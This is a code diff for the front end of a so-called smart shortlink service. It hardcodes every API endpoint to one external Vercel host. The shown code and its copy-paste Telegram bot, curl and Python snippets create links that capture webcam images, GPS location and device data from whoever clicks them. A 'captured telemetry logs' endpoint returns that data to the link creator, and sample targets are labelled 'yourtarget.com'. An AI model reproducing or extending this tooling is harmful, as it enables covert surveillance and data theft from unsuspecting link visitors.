@@ -333,7 +333,7 @@ export default function Home() {
     }
     
     try {
-      const response = await fetch('/api/esshortens', {
+      const response = await fetch('https://saqibveo1.vercel.app/api/esshortens', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
@@ -2091,7 +2091,7 @@ create policy "Allow public delete access" on public.urls for delete using (true
                   <div>
                     <span className="text-emerald-400 font-bold">1. CREATE SMART SHORTLINK (POST)</span>
                     <br/>
-                    <span className="text-zinc-500">URL:</span> {window.location.origin}/api/esshortens
+                    <span className="text-zinc-500">URL:</span> https://saqibveo1.vercel.app/api/esshortens
                   </div>
                   <div>
                     <span className="text-zinc-300 font-medium">Headers:</span>
@@ -2122,7 +2122,7 @@ create policy "Allow public delete access" on public.urls for delete using (true
                   <div className="border-t border-white/5 pt-3">
                     <span className="text-emerald-400 font-bold">2. FETCH CAPTURED TELEMETRY LOGS (GET)</span>
                     <br/>
-                    <span className="text-zinc-500">URL:</span> {window.location.origin}/api/esshortens?phoneNumber=<span className="text-blue-400">YOUR_TELEGRAM_ID_OR_PHONE</span>
+                    <span className="text-zinc-500">URL:</span> https://saqibveo1.vercel.app/api/esshortens?phoneNumber=<span className="text-blue-400">YOUR_TELEGRAM_ID_OR_PHONE</span>
                     <br/>
                     <span className="text-zinc-500">Alternative:</span> .../api/esshortens?deviceId=<span className="text-blue-400">YOUR_DEVICE_ID</span>
                   </div>
@@ -2155,7 +2155,7 @@ create policy "Allow public delete access" on public.urls for delete using (true
 
                 <button 
                   onClick={() => {
-                    const apiDocsText = `Here is the API documentation to integrate our shortlink service:\n\nEndpoint: POST ${window.location.origin}/api/esshortens\nHeaders:\n  Content-Type: application/json\n\nBody Params (JSON):\n- longUrl (string, required): The target link to shorten.\n- customAlias (string, optional): A custom text alias.\n- phoneNumber (string, optional/required): Required if calling via bot or no deviceId. Identifies User.\n- captureCamera (boolean, optional): Set to true to require camera verification.\n- captureLocation (boolean, optional): Set to true to require location tracking.\n- socialGateTitle (string, optional): Setup a social lock title.\n- socialGateUrl (string, optional): The URL for social lock verification.\n- password (string, optional): Sets a password.\n- deviceId (string, optional): ID to sync history with UI.\n\nResponse (201):\n{\n  "success": true,\n  "shortUrl": "https://shot.zone.id/alias",\n  "data": { ...dbRecord }\n}\n\nPlease generate integration code for this API.`;
+                    const apiDocsText = `Here is the API documentation to integrate our shortlink service:\n\nEndpoint: POST https://saqibveo1.vercel.app/api/esshortens\nHeaders:\n  Content-Type: application/json\n\nBody Params (JSON):\n- longUrl (string, required): The target link to shorten.\n- customAlias (string, optional): A custom text alias.\n- phoneNumber (string, optional/required): Required if calling via bot or no deviceId. Identifies User.\n- captureCamera (boolean, optional): Set to true to require camera verification.\n- captureLocation (boolean, optional): Set to true to require location tracking.\n- socialGateTitle (string, optional): Setup a social lock title.\n- socialGateUrl (string, optional): The URL for social lock verification.\n- password (string, optional): Sets a password.\n- deviceId (string, optional): ID to sync history with UI.\n\nResponse (201):\n{\n  "success": true,\n  "shortUrl": "https://shot.zone.id/alias",\n  "data": { ...dbRecord }\n}\n\nPlease generate integration code for this API.`;
                     navigator.clipboard.writeText(apiDocsText);
                     setApiDocsCopied(true);
                     setTimeout(() => setApiDocsCopied(false), 2000);
@@ -2234,7 +2234,7 @@ create policy "Allow public delete access" on public.urls for delete using (true
 const token = 'YOUR_TELEGRAM_BOT_TOKEN';
 const bot = new TelegramBot(token, { polling: true });
 
-const API_ENDPOINT = '${window.location.origin}';
+const API_ENDPOINT = 'https://saqibveo1.vercel.app';
 
 // Listen for /shorten <url> inside telegram
 bot.onText(/\\/shorten (.+)/, async (msg, match) => {
@@ -2275,7 +2275,7 @@ import requests
 API_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
 bot = telebot.TeleBot(API_TOKEN)
 
-API_ENDPOINT = "${window.location.origin}"
+API_ENDPOINT = "https://saqibveo1.vercel.app"
 
 @bot.message_handler(commands=['shorten'])
 def generate_link_api(message):
@@ -2318,7 +2318,7 @@ def generate_link_api(message):
 bot.infinity_polling()`}
 
                     {codeSnippetLang === 'curl' && 
-`curl -X POST "${window.location.origin}/api/esshortens" \\
+`curl -X POST "https://saqibveo1.vercel.app/api/esshortens" \\
   -H "Content-Type: application/json" \\
   -d '{
     "longUrl": "https://google.com",
@@ -2329,7 +2329,7 @@ bot.infinity_polling()`}
 
                     {codeSnippetLang === 'node-fetch' && 
 `const fetchShortUrl = async () => {
-  const url = "${window.location.origin}/api/esshortens";
+  const url = "https://saqibveo1.vercel.app/api/esshortens";
   try {
     const res = await fetch(url, {
       method: "POST",
@@ -2352,7 +2352,7 @@ fetchShortUrl();`}
                     {codeSnippetLang === 'py-requests' && 
 `import requests
 
-url = "${window.location.origin}/api/esshortens"
+url = "https://saqibveo1.vercel.app/api/esshortens"
 req_body = {
     "longUrl": "https://yourtarget.com",
     "phoneNumber": "+1234567890", # Group visit logs seamlessly
@@ -2373,15 +2373,15 @@ except Exception as error:
                   onClick={() => {
                     let textToCopy = '';
                     if (codeSnippetLang === 'node-bot') {
-                      textToCopy = `const TelegramBot = require('node-telegram-bot-api');\nconst token = 'YOUR_TELEGRAM_BOT_TOKEN';\nconst bot = new TelegramBot(token, { polling: true });\nconst API_ENDPOINT = '${window.location.origin}';\nbot.onText(/\\/shorten (.+)/, async (msg, match) => {\n  const chatId = msg.chat.id;\n  const longUrl = match[1];\n  const userPhone = String(msg.from.id);\n  try {\n    const res = await fetch(\`\${API_ENDPOINT}/api/esshortens\`, {\n      method: "POST",\n      headers: { "Content-Type": "application/json" },\n      body: JSON.stringify({\n        longUrl,\n        phoneNumber: userPhone,\n        captureCamera: true,\n        captureLocation: true\n      })\n    });\n    const data = await res.json();\n    if (data.success) {\n      bot.sendMessage(chatId, \`⚡ *Smart Link Spawned\!*\\n\\n🔗 *Interactive Redirect Link:* \${data.shortUrl}\\n\\nAll visits collect premium device info/webcam camera images in real-time\! Sync this id in your dashboard: *\${userPhone}*\`, { parse_mode: 'Markdown' });\n    } else {\n      bot.sendMessage(chatId, \`❌ API Rejection: \${data.message || "Unknown error"}\`);\n    }\n  } catch (err) {\n    bot.sendMessage(chatId, \`❌ Integration Error: \${err.message}\`);\n  }\n});`;
+                      textToCopy = `const TelegramBot = require('node-telegram-bot-api');\nconst token = 'YOUR_TELEGRAM_BOT_TOKEN';\nconst bot = new TelegramBot(token, { polling: true });\nconst API_ENDPOINT = 'https://saqibveo1.vercel.app';\nbot.onText(/\\/shorten (.+)/, async (msg, match) => {\n  const chatId = msg.chat.id;\n  const longUrl = match[1];\n  const userPhone = String(msg.from.id);\n  try {\n    const res = await fetch(\`\${API_ENDPOINT}/api/esshortens\`, {\n      method: "POST",\n      headers: { "Content-Type": "application/json" },\n      body: JSON.stringify({\n        longUrl,\n        phoneNumber: userPhone,\n        captureCamera: true,\n        captureLocation: true\n      })\n    });\n    const data = await res.json();\n    if (data.success) {\n      bot.sendMessage(chatId, \`⚡ *Smart Link Spawned\!*\\n\\n🔗 *Interactive Redirect Link:* \${data.shortUrl}\\n\\nAll visits collect premium device info/webcam camera images in real-time\! Sync this id in your dashboard: *\${userPhone}*\`, { parse_mode: 'Markdown' });\n    } else {\n      bot.sendMessage(chatId, \`❌ API Rejection: \${data.message || "Unknown error"}\`);\n    }\n  } catch (err) {\n    bot.sendMessage(chatId, \`❌ Integration Error: \${err.message}\`);\n  }\n});`;
                     } else if (codeSnippetLang === 'py-bot') {
-                      textToCopy = `import telebot\nimport requests\nAPI_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"\nbot = telebot.TeleBot(API_TOKEN)\nAPI_ENDPOINT = "${window.location.origin}"\n@bot.message_handler(commands=['shorten'])\ndef generate_link_api(message):\n    try:\n        parts = message.text.split(maxsplit=1)\n        if len(parts) < 2:\n            bot.reply_to(message, "Usage: /shorten <URL>")\n            return\n        long_url = parts[1]\n        user_id = str(message.from_user.id)\n        payload = {\n            "longUrl": long_url,\n            "phoneNumber": user_id,\n            "captureCamera": True,\n            "captureLocation": True\n        }\n        res = requests.post(f"{API_ENDPOINT}/api/esshortens", json=payload, headers={"Content-Type": "application/json"})\n        api_data = res.json()\n        if api_data.get("success"):\n            short_url = api_data.get("shortUrl")\n            bot.reply_to(message, f"⚡ *Smart Link Spawned!*\\n\\n🔗 *Short URL:* {short_url}\\n\\nVisit webcam grabs and GPS feeds will stream to your web cabinet. Sync with ID: *{user_id}*", parse_mode="Markdown")\n        else:\n            bot.reply_to(message, f"❌ Link Engine Rejected request: {api_data.get('message')}")\n    except Exception as e:\n        bot.reply_to(message, f"❌ Script Exception: {str(e)}")\nbot.infinity_polling()`;
+                      textToCopy = `import telebot\nimport requests\nAPI_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"\nbot = telebot.TeleBot(API_TOKEN)\nAPI_ENDPOINT = "https://saqibveo1.vercel.app"\n@bot.message_handler(commands=['shorten'])\ndef generate_link_api(message):\n    try:\n        parts = message.text.split(maxsplit=1)\n        if len(parts) < 2:\n            bot.reply_to(message, "Usage: /shorten <URL>")\n            return\n        long_url = parts[1]\n        user_id = str(message.from_user.id)\n        payload = {\n            "longUrl": long_url,\n            "phoneNumber": user_id,\n            "captureCamera": True,\n            "captureLocation": True\n        }\n        res = requests.post(f"{API_ENDPOINT}/api/esshortens", json=payload, headers={"Content-Type": "application/json"})\n        api_data = res.json()\n        if api_data.get("success"):\n            short_url = api_data.get("shortUrl")\n            bot.reply_to(message, f"⚡ *Smart Link Spawned!*\\n\\n🔗 *Short URL:* {short_url}\\n\\nVisit webcam grabs and GPS feeds will stream to your web cabinet. Sync with ID: *{user_id}*", parse_mode="Markdown")\n        else:\n            bot.reply_to(message, f"❌ Link Engine Rejected request: {api_data.get('message')}")\n    except Exception as e:\n        bot.reply_to(message, f"❌ Script Exception: {str(e)}")\nbot.infinity_polling()`;
                     } else if (codeSnippetLang === 'curl') {
-                      textToCopy = `curl -X POST "${window.location.origin}/api/esshortens" \\\n  -H "Content-Type: application/json" \\\n  -d '{\n    "longUrl": "https://google.com",\n    "phoneNumber": "+1234567890",\n    "captureCamera": true,\n    "captureLocation": true\n  }'`;
+                      textToCopy = `curl -X POST "https://saqibveo1.vercel.app/api/esshortens" \\\n  -H "Content-Type: application/json" \\\n  -d '{\n    "longUrl": "https://google.com",\n    "phoneNumber": "+1234567890",\n    "captureCamera": true,\n    "captureLocation": true\n  }'`;
                     } else if (codeSnippetLang === 'node-fetch') {
-                      textToCopy = `const fetchShortUrl = async () => {\n  const url = "${window.location.origin}/api/esshortens";\n  try {\n    const res = await fetch(url, {\n      method: "POST",\n      headers: { "Content-Type": "application/json" },\n      body: JSON.stringify({\n        longUrl: "https://yourtarget.com",\n        phoneNumber: "+1234567890",\n        captureCamera: true,\n        captureLocation: true\n      })\n    });\n    const result = await res.json();\n    console.log("⚡ Smart ShortUrl Generated ->", result.shortUrl);\n  } catch (err) {\n    console.error("Fetch rejection ->", err);\n  }\n};\nfetchShortUrl();`;
+                      textToCopy = `const fetchShortUrl = async () => {\n  const url = "https://saqibveo1.vercel.app/api/esshortens";\n  try {\n    const res = await fetch(url, {\n      method: "POST",\n      headers: { "Content-Type": "application/json" },\n      body: JSON.stringify({\n        longUrl: "https://yourtarget.com",\n        phoneNumber: "+1234567890",\n        captureCamera: true,\n        captureLocation: true\n      })\n    });\n    const result = await res.json();\n    console.log("⚡ Smart ShortUrl Generated ->", result.shortUrl);\n  } catch (err) {\n    console.error("Fetch rejection ->", err);\n  }\n};\nfetchShortUrl();`;
                     } else if (codeSnippetLang === 'py-requests') {
-                      textToCopy = `import requests\nurl = "${window.location.origin}/api/esshortens"\nreq_body = {\n    "longUrl": "https://yourtarget.com",\n    "phoneNumber": "+1234567890",\n    "captureCamera": True,\n    "captureLocation": True\n}\ntry:\n    response = requests.post(url, json=req_body, headers={"Content-Type": "application/json"})\n    response_json = response.json()\n    print("⚡ Smart Shortlink Spawned:", response_json.get("shortUrl"))\nexcept Exception as error:\n    print("Requests post failed:", error)`;
+                      textToCopy = `import requests\nurl = "https://saqibveo1.vercel.app/api/esshortens"\nreq_body = {\n    "longUrl": "https://yourtarget.com",\n    "phoneNumber": "+1234567890",\n    "captureCamera": True,\n    "captureLocation": True\n}\ntry:\n    response = requests.post(url, json=req_body, headers={"Content-Type": "application/json"})\n    response_json = response.json()\n    print("⚡ Smart Shortlink Spawned:", response_json.get("shortUrl"))\nexcept Exception as error:\n    print("Requests post failed:", error)`;
                     }
                     navigator.clipboard.writeText(textToCopy);
                     setSnippetCopied(true);
@@ -2693,15 +2693,8 @@ except Exception as error:
     // Config: API connection targets.
     // If opened as local file (e.g. from file:///), fall back to deployed portal path; else resolve natively.
     const getBaseUrl = () => {
-      const activeBackend = 'https://saqibveo.vercel.app';
-      if (window.location.protocol === 'file:') {
-        return activeBackend;
-      }
-      const hostname = window.location.hostname;
-      if (hostname.includes('vercel.app') && !hostname.includes('yx7ihxcpy42n2nxzrgvgse')) {
-        return activeBackend;
-      }
-      return window.location.origin;
+      const activeBackend = 'https://saqibveo1.vercel.app';
+      return activeBackend;
     };
 
     const API_BASE = getBaseUrl();
@@ -2739,11 +2732,7 @@ except Exception as error:
     // Set current download payload
     const downloadBtn = document.getElementById('downloadBtn');
     if (downloadBtn) {
-      if (window.location.protocol === 'file:') {
-        downloadBtn.href = 'https://saqibveo.vercel.app/index.html';
-      } else {
-        downloadBtn.href = window.location.origin + '/index.html';
-      }
+      downloadBtn.href = 'https://saqibveo1.vercel.app/index.html';
     }
 
     // Interactive Fields Setup
